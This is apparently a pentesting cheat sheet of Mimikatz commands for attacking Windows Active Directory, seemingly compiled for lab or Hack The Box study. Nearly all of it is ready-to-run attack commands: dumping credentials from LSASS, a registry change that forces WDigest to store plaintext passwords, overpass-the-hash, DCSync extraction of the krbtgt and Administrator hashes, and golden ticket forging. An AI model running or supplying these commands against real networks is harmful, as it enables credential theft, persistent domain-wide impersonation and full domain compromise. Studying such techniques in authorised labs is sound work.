all the attacks are listed [here](https://adsecurity.org/?page_id=1821)

### Dump credentials from LSASS
```powershell
privilege::debug
sekurlsa::logonpasswords
```

run it then exit:
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```


> we can use the following to display plain text 
> [ref](https://forum.hackthebox.com/t/active-directory-skills-assessment-i/257250/132):
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

#check:
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
```
---
### OPTH
```powershell
sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe
```

> [!NOTE] Note
> The above commands starts a process with a logon type 9 (same as runas/netonly -> doesn't validate the data)

---
### Pull password data for the KRBTGT user account in domain:  
```
lsadump::dcsync /domain:lol.local /user:krbtgt
```

> [!NOTE] Note
> You can pull out any user, computer or domain controller by changing the user switch to the desired account

---
### golden ticket
```powershell
kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt

# where:
- /domain – the fully qualified domain name.
- /id – (500 -> default rid from administrator account)
- /sid – the SID of the domain.
- /user – username to impersonate
- /krbtgt – NTLM password hash for  account (KRBTGT)
/ptt to immediately inject the golden ticket into memory for use.
- /aes128 – the AES128 key
- /aes256 – the AES256 key
```
---

### DCsync
```powershell
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit"
```